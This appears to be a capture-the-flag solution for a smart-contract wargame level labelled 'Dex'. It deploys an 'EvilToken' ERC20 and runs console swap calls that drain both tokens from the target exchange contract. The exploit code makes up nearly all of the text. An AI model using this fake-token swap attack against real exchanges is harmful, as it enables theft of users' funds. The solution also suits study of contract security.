@@ -1,0 +1,23 @@
+Level 23: Dex
+
+Deploy
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract EvilToken is ERC20 {
+    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
+        _mint(msg.sender, initialSupply);
+    }
+}
+
+evlToken = '<EVL-token-address>'
+t1 = await contract.token1()
+t2 = await contract.token2()
+
+await contract.swap(evlToken, t1, 100)
+await contract.balanceOf(t1, instance).then(v => v.toString())
+await contract.swap(evlToken, t2, 200)
+await contract.balanceOf(t2, instance).then(v => v.toString())
